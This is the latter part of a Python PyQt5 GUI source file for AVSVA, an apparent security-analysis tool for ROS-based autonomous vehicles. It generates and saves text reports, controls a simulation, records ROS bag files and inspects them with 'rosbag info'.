                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        preview_layout = QVBoxLayout()

        self.report_preview = QTextEdit()
        self.report_preview.setReadOnly(True)
        self.report_preview.setPlainText("Report preview will appear here after generation...")
        self.report_preview.setStyleSheet("""
            QTextEdit {
                background-color: #f9fafb;
                border: 1px solid #e5e7eb;
                border-radius: 4px;
                padding: 12px;
                font-family: 'Courier New', monospace;
            }
        """)
        preview_layout.addWidget(self.report_preview)
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)

        # Action buttons
        button_layout = QHBoxLayout()
        button_layout.addStretch()

        generate_btn = QPushButton("Generate Report")
        generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #2563eb;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 11pt;
            }
            QPushButton:hover {
                background-color: #1d4ed8;
            }
            QPushButton:pressed {
                background-color: #1e40af;
            }
        """)
        generate_btn.clicked.connect(self.generate_report)
        button_layout.addWidget(generate_btn)

        save_btn = QPushButton("Save Report")
        save_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 11pt;
            }
            QPushButton:hover {
                background-color: #047857;
            }
            QPushButton:pressed {
                background-color: #065f46;
            }
        """)
        save_btn.clicked.connect(self.save_report)
        button_layout.addWidget(save_btn)

        layout.addLayout(button_layout)

        self.tabs.addTab(tab, "Generate Report")

    def generate_report(self):
        """Generate the security report"""
        self.add_log("Generating security report...")

        report_content = []
        report_content.append("=" * 80)
        report_content.append("AVSVA SECURITY ANALYSIS REPORT")
        report_content.append("=" * 80)
        report_content.append(f"\nGenerated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        if self.include_exec_summary.isChecked():
            report_content.append("\n" + "=" * 80)
            report_content.append("EXECUTIVE SUMMARY")
            report_content.append("=" * 80)
            report_content.append("\nThis report documents security vulnerabilities identified in ROS-based")
            report_content.append("autonomous vehicle systems through the AVSVA framework.")

        if self.include_vulnerabilities.isChecked():
            report_content.append("\n" + "=" * 80)
            report_content.append("IDENTIFIED VULNERABILITIES")
            report_content.append("=" * 80)
            for vuln in self.vulnerabilities:
                report_content.append(f"\n[{vuln['severity'].upper()}] {vuln['name']}")
                report_content.append(f"Category: {vuln['category']}")
                report_content.append(f"Description: {vuln['description']}")
                report_content.append(f"Impact: {vuln['impact']}\n")

        if self.include_recommendations.isChecked():
            report_content.append("\n" + "=" * 80)
            report_content.append("SECURITY RECOMMENDATIONS")
            report_content.append("=" * 80)
            report_content.append("\n1. Implement ROS authentication and encryption")
            report_content.append("2. Deploy network segmentation and firewalls")
            report_content.append("3. Use ROS-Defender or similar security frameworks")
            report_content.append("4. Implement input validation and rate limiting")
            report_content.append("5. Enable comprehensive logging and monitoring")
            report_content.append("6. Regular security audits and penetration testing\n")

        report_content.append("\n" + "=" * 80)
        report_content.append("END OF REPORT")
        report_content.append("=" * 80)

        self.report_preview.setPlainText("\n".join(report_content))
        self.add_log("Report generated successfully")

    def save_report(self):
        """Save the generated report to a file"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Report",
            f"avsva_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text Files (*.txt);;PDF Files (*.pdf);;HTML Files (*.html);;Markdown Files (*.md)"
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(self.report_preview.toPlainText())
                self.add_log(f"Report saved to: {file_path}")
                QMessageBox.information(self, "Success", f"Report saved successfully to:\n{file_path}")
            except Exception as e:
                self.add_log(f"Error saving report: {str(e)}")
                QMessageBox.critical(self, "Error", f"Failed to save report:\n{str(e)}")

    def add_log(self, message):
        """Add a message to the log output"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{timestamp}] {message}")
        self.log_output.verticalScrollBar().setValue(
            self.log_output.verticalScrollBar().maximum()
        )
    
    def start_simulation(self):
        """Start the simulation"""
        self.simulation_controller = SimulationController()
        self.simulation_controller.log_signal.connect(self.add_log)
        self.simulation_controller.status_signal.connect(self.update_sim_status)
        self.simulation_controller.start()
        
        self.start_sim_btn.setEnabled(False)
        self.stop_sim_btn.setEnabled(True)
    
    def stop_simulation(self):
        """Stop the simulation"""
        if self.simulation_controller:
            self.simulation_controller.stop()
            self.simulation_controller.wait()
        
        self.start_sim_btn.setEnabled(True)
        self.stop_sim_btn.setEnabled(False)
        self.start_rec_btn.setEnabled(False)
        self.stop_rec_btn.setEnabled(False)
    
    def update_sim_status(self, running):
        """Update simulation status indicator"""
        if running:
            self.status_indicator.setText("● Running")
            self.status_indicator.setStyleSheet("color: #10b981;")
            self.start_rec_btn.setEnabled(True)
        else:
            self.status_indicator.setText("● Stopped")
            self.status_indicator.setStyleSheet("color: #dc2626;")
            self.start_rec_btn.setEnabled(False)
    
    def start_recording(self):
        """Start bag file recording"""
        self.bag_recorder = BagRecorder()
        self.bag_recorder.log_signal.connect(self.add_log)
        self.bag_recorder.status_signal.connect(self.update_rec_status)
        self.bag_recorder.start()
        
        self.start_rec_btn.setEnabled(False)
        self.stop_rec_btn.setEnabled(True)
    
    def stop_recording(self):
        """Stop bag file recording"""
        if self.bag_recorder:
            self.bag_recorder.stop()
            self.bag_recorder.wait()
        
        self.start_rec_btn.setEnabled(True)
        self.stop_rec_btn.setEnabled(False)
        
        # Refresh bag list
        self.refresh_bag_list()
    
    def update_rec_status(self, recording):
        """Update recording status indicator"""
        if recording:
            self.rec_indicator.setText("● Recording")
            self.rec_indicator.setStyleSheet("color: #dc2626;")
        else:
            self.rec_indicator.setText("● Not Recording")
            self.rec_indicator.setStyleSheet("color: #6b7280;")
    
    def refresh_bag_list(self):
        """Refresh the list of bag files"""
        self.bag_list.clear()
        
        bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
        if os.path.exists(bags_dir):
            bag_files = [f for f in os.listdir(bags_dir) if f.endswith('.bag')]
            bag_files.sort(reverse=True)  # Most recent first
            
            for bag_file in bag_files:
                self.bag_list.addItem(bag_file)
            
            self.add_log(f"Found {len(bag_files)} bag files")
        else:
            self.add_log("No recorded bags directory found")
    
    def load_bag_file(self, item):
        """Load and analyze a bag file"""
        bag_filename = item.text()
        bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
        bag_path = os.path.join(bags_dir, bag_filename)
        
        self.analyze_bag_file(bag_path)
    
    def load_external_bag(self):
        """Load an external bag file"""
        filename, _ = QFileDialog.getOpenFileName(
            self,
            "Select Bag File",
            "",
            "Bag Files (*.bag);;All Files (*)"
        )
        
        if filename:
            self.analyze_bag_file(filename)
    
    def analyze_bag_file(self, bag_path):
        """Analyze a bag file using rosbag info"""
        try:
            self.analysis_output.clear()
            self.analysis_output.append(f"Analyzing: {os.path.basename(bag_path)}\n")
            self.analysis_output.append("=" * 80 + "\n")
            
            # Run rosbag info
            result = subprocess.run(
                ['rosbag', 'info', bag_path],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.analysis_output.append(result.stdout)
                self.add_log(f"Analyzed bag file: {os.path.basename(bag_path)}")
            else:
                self.analysis_output.append(f"Error analyzing bag file:\n{result.stderr}")
                self.add_log(f"Error analyzing bag file: {os.path.basename(bag_path)}")
            
            # Add some additional analysis
            self.analysis_output.append("\n" + "=" * 80)
            self.analysis_output.append("\nAVSVA Analysis:")
            self.analysis_output.append("-" * 80)
            
            # Check for attack indicators
            if '/husky_velocity_controller/cmd_vel' in result.stdout:
                self.analysis_output.append("\n✓ CMD_VEL topic found - check for conflicting commands")
            
            if '/husky_velocity_controller/odom' in result.stdout:
                self.analysis_output.append("✓ Odometry topic found - analyze for spoofing patterns")
            
            if '/imu/data' in result.stdout:
                self.analysis_output.append("✓ IMU topic found - check for anomalous sensor readings")
            
            self.analysis_output.append("\n\nTo further analyze this bag file, use:")
            self.analysis_output.append(f"  rosbag play {bag_path}")
            self.analysis_output.append(f"  rostopic echo /husky_velocity_controller/cmd_vel")
            
        except subprocess.TimeoutExpired:
            self.analysis_output.append("Error: Analysis timed out")
            self.add_log("Bag file analysis timed out")
        except Exception as e:
            self.analysis_output.append(f"Error: {str(e)}")
            self.add_log(f"Error analyzing bag file: {str(e)}")
    
    def closeEvent(self, event):
        """Handle application close"""
        # Stop simulation and recording if running
        if self.simulation_controller and self.simulation_controller.running:
            self.stop_simulation()
        
        if self.bag_recorder and self.bag_recorder.recording:
            self.stop_recording()
        
        event.accept()


def main():
    app = QApplication(sys.argv)
    
    # Set application-wide font
    font = QFont('Arial', 10)
    app.setFont(font)
    
    window = AVSVAMainWindow()
    window.show()
    
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()